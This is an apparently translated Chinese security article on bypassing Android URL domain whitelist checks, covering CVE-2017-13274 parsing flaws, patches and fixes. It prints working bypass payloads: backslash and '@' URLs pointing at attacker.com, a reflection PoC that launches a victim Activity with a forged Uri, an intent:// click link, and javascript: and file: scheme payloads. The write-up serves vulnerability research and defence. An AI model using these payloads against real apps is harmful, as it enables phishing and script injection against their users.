# 绕过Android域名白名单校验的方法

阅读量 **337524**

|评论 **3**

发布时间 : 2019-07-22 16:12:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01749d64e27bd4a4c6.jpg)

## 0\. 引言

很多 Android 组件都有响应外部链接的能力，如果攻击者能随意的指定这些组件所响应的 url，轻则可以引导被攻击的 APP
弹出钓鱼页面，重则可能远程执行恶意 js 代码。 因此 APP 开发者必然要对传入的 url
进行校验，而设置域名白名单就是一种简单常见且具有较高安全性的防御方法。

然而由于一些开发者并不完全通晓调用方法的底层特性，使得看起来万无一失的白名单校验形同虚设。 本文列举几种常见的 Android
域名白名单校验写法，并深入源码指出其中存在的风险和绕过方法。

## 1\. Url加入反斜杠”\”

###  1.1. 方法描述

先来看一种典型的域名校验写法:

    
    
    /*  Uri 结构
    *   [scheme:][//authority][path][?query][#fragment]
    */
    [check_v1]
    Uri uri = Uri.parse(attackerControlledString);
    if ("legitimate.com".equals(uri.getHost()) || uri.getHost().endsWith(".legitimate.com")) {
        webView.loadUrl(attackerControlledString, getAuthorizationHeaders());
        // or webView.loadUrl(uri.toString()) 
    }

然而…

    
    
    String url = "http://attacker.com\\.legitimate.com/smth"; 
    Log.d("getHost:", Uri.parse(url).getHost());         // 输出 attacker.com\.legitimate.com ! 
    if (Uri.parse(url).getHost().endsWith(".legitimate.com")) { 
            webView.loadUrl(url, getAuthorizationHeaders());  // 成功加载 attacker.com！
    }

可以看到 getHost() 和 loadUrl()
的表现不一致，if检验跳转目标是legitimate.com，但执行时浏览器会把反斜线纠正为正斜线去访问attacker.com。 那么如果是用
equals() 来做完整的 host 检验该怎么办呢？ 只需加一个‘@’就能隔断非法前缀。

    
    
    String url = "http://attacker.com\\@legitimate.com/smth";
    Log.d("Wow", Uri.parse(url).getHost());          // 输出 legitimate.com!
    webView.loadUrl(url, getAuthorizationHeaders()); // 加载 attacker.com！

###  1.2. 分析原因

看来android.net.Uri的 parse() 是有安全缺陷的，我们扒拉一下代码定位问题…

    
    
    [frameworks/base/core/java/android/net/Uri.java]
    public static Uri parse(String uriString) {
            return new StringUri(uriString);
    }

继续看这个内部类StringUri

    
    
    [frameworks/base/core/java/android/net/Uri.java]
    private static class StringUri extends AbstractHierarchicalUri {
            ...
            private StringUri(String uriString) {
                this.uriString = uriString;
            }
            ...
            private Part getAuthorityPart() {
                if (authority == null) {
                    String encodedAuthority
                            = parseAuthority(this.uriString, findSchemeSeparator());
                    return authority = Part.fromEncoded(encodedAuthority);
                }
                return authority;
            }
            ...
            static String parseAuthority(String uriString, int ssi) {
                int length = uriString.length();
                // If "//" follows the scheme separator, we have an authority.
                if (length > ssi + 2
                        && uriString.charAt(ssi + 1) == '/'
                        && uriString.charAt(ssi + 2) == '/') {
                    // We have an authority.
                    // Look for the start of the path, query, or fragment, or the
                    // end of the string.
                    int end = ssi + 3;
                    LOOP: while (end < length) {
                        switch (uriString.charAt(end)) {
                            case '/': // Start of path
                            case '?': // Start of query
                            case '#': // Start of fragment
                                break LOOP;
                        }
                        end++;
                    }
                    return uriString.substring(ssi + 3, end);
                } else {
                    return null;
                }
            }
    }

这里就明显看到StringUri没有对authority部分做反斜杠的识别处理,
接着找StringUri的父类AbstractHierarchicalUri瞧瞧

    
    
    [frameworks/base/core/java/android/net/Uri.java]
    private abstract static class AbstractHierarchicalUri extends Uri {
        private String parseUserInfo() {
            String authority = getEncodedAuthority();
            int end = authority.indexOf('@');
            return end == NOT_FOUND ? null : authority.substring(0, end);
        }
        ...
        private String parseHost() {
            String authority = getEncodedAuthority();
            // Parse out user info and then port.
            int userInfoSeparator = authority.indexOf('@');
            int portSeparator = authority.indexOf(':', userInfoSeparator);
            String encodedHost = portSeparator == NOT_FOUND
                    ? authority.substring(userInfoSeparator + 1)
                    : authority.substring(userInfoSeparator + 1, portSeparator);
            return decode(encodedHost);
        }
    }

就在这里把@符号之前内容的作为 UserInfo 给切断了，host 内容从@符号之后算起。（这里其实存在另一个 bug，没有考虑多个@的情况）

###  1.3. 影响范围

Google 在 2018年4月的 Android
安全公告里发布了这个漏洞[CVE-2017-13274](https://source.android.com/security/bulletin/2018-04-01#android-runtime)的[补丁](https://android.googlesource.com/platform/frameworks/base/+/0b57631939f5824afef06517df723d2e766e0159%5E%21/)

通过 [AndroidXRef](http://androidxref.com/) 查询，这个补丁在 Oreo – 8.1.0_r33 才加入到原生源码中。
所以安全补丁日期早于2018-04-01的系统都受影响，而 Google 一般通过协议要求 OEM
厂商保证产品上市之后两年内按期打安全补丁。那么经过推算得出 Android 6及以下的系统都受影响。

PS：url含多个@的情况也在2018年1月的补丁中进行了修复[CVE-2017-13176](https://android.googlesource.com/platform/frameworks/base/+/4afa0352d6c1046f9e9b67fbf0011bcd751fcbb5%5E%21/)

## 2\. 反射调用HierarchicalUri构造Uri

## 2.1. 检查UserInfo

上一节提到了@的截取的特性，会把恶意地址前缀attacker.com存入 UserInfo，那么现在改进校验方法, 加上 UserInfo
的检查是不是就万无一失了呢？

    
    
    [check_v2]
    Uri uri = getIntent().getData();
    boolean isOurDomain = "https".equals(uri.getScheme()) &&
                          uri.getUserInfo() == null &&
                          "legitimate.com".equals(uri.getHost());
    if (isOurDomain) {
        webView.load(uri.toString(), getAuthorizationHeaders());
    }

## 2.2. 挖掘思路

我们还是看android.net.Uri源码，发现除了StringUri，还有一个内部类也 HierarchicalUri 也继承了
AbstractHierarchicalUri

    
    
    [frameworks/base/core/java/android/net/Uri.java]
    private static class HierarchicalUri extends AbstractHierarchicalUri {
    
        private final String scheme; // can be null
        private final Part authority;
        private final PathPart path;
        private final Part query;
        private final Part fragment;
    
        private HierarchicalUri(String scheme, Part authority, PathPart path, Part query, Part fragment) {
            this.scheme = scheme;
            this.authority = Part.nonNull(authority);
            this.path = path == null ? PathPart.NULL : path;
            this.query = Part.nonNull(query);
            this.fragment = Part.nonNull(fragment);
        }
    
        ...
    }

而 AbstractHierarchicalUri 又是继承自 Uri，所以很容易想到，通过反射调用 HierarchicalUri
这个私有构造函数，传入构造好的 authority 和 path, 创建一个任意可控的 Uri 实例。 继续查看 Part 和 PathPart
类的构造方法：

    
    
    static class Part extends AbstractPart {
        private Part(String encoded, String decoded) {
            super(encoded, decoded);
        }
    }
    static class PathPart extends AbstractPart {
        private PathPart(String encoded, String decoded) {
            super(encoded, decoded);
        }
    }

###  2.3. 构造PoC

由此构造 PoC 如下：

    
    
    public void PoC() {
        private static final String TAG = "PoC";
        String attackerUri = "@attacker.com";
        String legitimateUri = "legitimate.com";
    
        try {
            Class partClass = Class.forName("android.net.Uri$Part");
            Constructor partConstructor = partClass.getDeclaredConstructors()[0];
            partConstructor.setAccessible(true);
    
            Class pathPartClass = Class.forName("android.net.Uri$PathPart");
            Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];
            pathPartConstructor.setAccessible(true);
    
            Class hierarchicalUriClass = Class.forName("android.net.Uri$HierarchicalUri");
            Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];
            hierarchicalUriConstructor.setAccessible(true);
    
            Object authority = partConstructor.newInstance(legitimateUri, legitimateUri);
            Object path = pathPartConstructor.newInstance(attackerUri, attackerUri);
            Uri uri = (Uri) hierarchicalUriConstructor.newInstance("https", authority, path, null, null);
    
            Log.d(TAG, "Scheme: " + uri.getScheme());
            Log.d(TAG, "UserInfo: " + uri.getUserInfo());
            Log.d(TAG, "Host: " + uri.getHost());
            Log.d(TAG, "toString(): " + uri.toString());
    
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName(Victim_packageName, Victim_className);
        intent.setData(uri);
        intent.addFlags(268435456);
        startActivity(intent);
    }

logcat 输出：

    
    
    07-07 19:00:36.765 9209 9209 D PoC : Scheme: https
    07-07 19:00:36.765 9209 9209 D PoC : UserInfo: null
    07-07 19:00:36.765 9209 9209 D PoC : Host: legitimate.com
    07-07 19:00:36.765 9209 9209 D PoC : toString(): https://legitimate.com@attacker.com

从输出日志可以看到，通过此反射方法构造的 Uri 对象，可以通过 check_v2 方法对 Scheme、 UserInfo 和 Host 的三项检验，但
toString() 方法的值https://legitimate.com@attacker.com，才是被攻击的 Activity
拉起的实际地址。如前所述，@符号之后的 attacker.com 便成为了最终访问的 host。

###  2.4. 限制与绕过

Android P 之后 Google 对 non-sdk 的 @hide API 进行了限制。Android Studio
也会给出如下提示，并且让这种反射调用在运行时报错失败。

Accessing internal APIs via reflection is not supported and may not work on
all devices or in the future less… (Ctrl+F1) Inspection info:Using reflection
to access hidden/private Android APIs is not safe; it will often not work on
devices from other vendors, and it may suddenly stop working (if the API is
removed) or crash spectacularly (if the API behavior changes, since there are
no guarantees for compatibility). Issue id: PrivateApi

截止到目前——Android Q Beta 4，还是有[绕过的方法](https://github.com/tiann/FreeReflection),
关于绕过原理的梳理不在本文议题范围。

###  2.5. 修复方法

抵御这种攻击的方法也非常简单，对传入的 Uri 对象加一次 parse() 再做 check_v2 即可。
事实上，有大量的开发者因为不了解这个性质，认为传入的 url 已经是”正常“通过 Uri.parse() 构造的，直接信任放行。

## 3\. 远程利用方法1

我们知道，通过在组件中注册 intent-filter，App 可以响应浏览器应用或短信应用访问的外链。 典型的一个配置写法如下，只有 <data>
标签中指定的内容和 Intent 中携带的 Data 完全一致时，当前活动才能响应该 Intent。

    
    
    <activity android:name=".DeeplinkActivity">
        <intent-filter android:autoVerify="true">
            <action android:name="android.intent.action.VIEW"/>
            <category android:name="android.intent.category.DEFAULT"/>
            <category android:name="android.intent.category.BROWSABLE"/>
            <data android:scheme="https" android:host="legitimate.com"/>
        </intent-filter>
    </activity>

前面两种方法我们都是用安装恶意 App 或 ADB 命令来触发攻击，注意到 Android 对 <data> 定义的属性，也是通过
parsedIntent.getData().getHost() 来进行匹配的，我们很自然的想到尝试远程利用。

    
    
    <!--    <a href="[scheme]://[host]/[path]?[query]">调用格式</a> 
    -->
    <a href="https://attacker.com\\@legitimate.com/">Click Attack v1</a>
    <a href="https://attacker.com%5C%5C@legitimate.com/">Click Attack v2</a>

然而，对于第一个链接，浏览器会自动把反斜杠 “\” 纠正为正斜杠 “/” 对于第二个链接，反斜杠 “\” 会以 URL 编码形式保留而无法触发方法1

通过仔细研究intent://scheme的[工作机制](http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/content/Intent.java#6021)，发现可以通过如下方式保留反斜杠
“\” 的方法：

PoC:

    
    
    <a href="intent://not_used/#Intent;scheme=https://attacker.com\\@legitimate.com/;end">Click Attack v3</a>

跟踪[源码](http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/content/Intent.java#6123)，可以看到，访问这个链接，等价于执行：

    
    
    Uri.parse("https://attacker.com\\\\@legitimate.com/://not_used/")

从而实现方法1的远程执行版本

## 4\. 缺少scheme验证

实战不乏有些 App 对 host 做了校验，但却遗漏了对 scheme 的检查。

可以用下面的 uri， 尝试进行 js 和 file 域的 PoC

javascript://legitimate.com/%0aalert(1)//

file://legitimate.com/sdcard/payload.html

## 5\. 参考链接

https://hackerone.com/reports/431002

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **小米安全中心** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/182420](/post/id/182420)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Android](/tag/Android)
  * [移动安全](/tag/移动安全)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhimg.com/t0168593a4f77994a30.png) 小米安全中心

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

